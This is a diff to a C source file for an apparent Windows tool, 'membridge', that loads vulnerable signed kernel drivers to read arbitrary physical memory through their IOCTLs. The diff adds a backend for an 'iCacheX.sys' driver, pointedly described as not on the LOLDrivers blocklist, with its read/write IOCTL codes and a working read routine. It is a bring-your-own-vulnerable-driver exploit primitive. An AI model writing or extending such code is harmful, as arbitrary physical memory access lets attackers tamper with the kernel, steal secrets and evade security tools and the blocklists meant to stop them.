@@ -25,7 +25,7 @@
 #include <stdlib.h>
 
 typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
-typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP, LY_DIRECTIO, LY_TDEIO } layout_t;
+typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP, LY_DIRECTIO, LY_TDEIO, LY_ICACHEX } layout_t;
 
 typedef struct {
     const wchar_t *id;
@@ -99,6 +99,9 @@ static const backend_t g_backends[] = {
     { L"tdeio", L"drivers\\tdeio\\TdeIo64.sys",
       BK_CONTROL, L"MembridgeTdeIo", L"\\\\.\\TdeIo", LY_TDEIO, 1,
       L"TdeIo64.sys (LOLDrivers unlisted TDE I/O driver; IOCTL 0x91102440 maps arbitrary 64-bit physical range to user VA; read/write capable)" },
+    { L"icachex", L"drivers\\icachex\\iCacheX.sys",
+      BK_CONTROL, L"MembridgeICacheX", L"\\\\.\\iCacheX", LY_ICACHEX, 1,
+      L"iCacheX(1).sys (LOLDrivers unlisted; embeds OlsApi: OlsApiReadMemory 0x9C406104 + OlsApiWriteMemory 0x9C40A108, arbitrary 64-bit physical read/write)" },
     { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
       BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
       L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
@@ -136,6 +139,7 @@ static const char *layout_name(layout_t l) {
     case LY_FASTDUMP: return "fastdump";
     case LY_DIRECTIO: return "directio";
     case LY_TDEIO: return "tdeio";
+    case LY_ICACHEX: return "icachex";
     }
     return "?";
 }
@@ -741,6 +745,22 @@ static int read_tdeio(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
     return 1;
 }
 
+// iCacheX(1).sys (unlisted; embeds OlsApi): OlsApiReadMemory IOCTL 0x9C406104.
+// Input 16 bytes: {u64 PA; u32 width(1/2/4); u32 count}; output = width*count bytes.
+static int read_icachex(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
+    uint8_t in[16];
+    DWORD ret = 0;
+    memset(in, 0, sizeof(in));
+    *(uint64_t *)(in + 0) = pa;
+    *(uint32_t *)(in + 8) = 1;
+    *(uint32_t *)(in + 12) = size;
+    if (!DeviceIoControl(dev, 0x9C406104u, in, sizeof(in), out, size, &ret, NULL)) {
+        wprintf(L"[ERR] icachex OlsApiReadMemory err=%lu\n", GetLastError());
+        return 0;
+    }
+    return 1;
+}
+
 static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
     switch (ly) {
     case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
@@ -756,6 +776,7 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     case LY_FASTDUMP: return read_fastdump(dev, pa, size, out);
     case LY_DIRECTIO: return read_directio(dev, pa, size, out);
     case LY_TDEIO: return read_tdeio(dev, pa, size, out);
+    case LY_ICACHEX: return read_icachex(dev, pa, size, out);
     }
     return 0;
 }
@@ -797,7 +818,7 @@ static void usage(void) {
     wprintf(L"  membridge --list\n");
     wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
     wprintf(L"               [--driver-path <path>] [--no-load]\n");
-    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump|directio|tdeio>\n");
+    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump|directio|tdeio|icachex>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
     for (int i = 0; i < NBACKENDS; i++) {
@@ -852,6 +873,7 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(layout, L"fastdump") == 0 || _wcsicmp(layout, L"fastdumpx64") == 0) g_manual_layout = LY_FASTDUMP;
         else if (_wcsicmp(layout, L"directio") == 0) g_manual_layout = LY_DIRECTIO;
         else if (_wcsicmp(layout, L"tdeio") == 0) g_manual_layout = LY_TDEIO;
+        else if (_wcsicmp(layout, L"icachex") == 0) g_manual_layout = LY_ICACHEX;
         else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
     } else if (backend) {
         for (int i = 0; i < NBACKENDS; i++) {
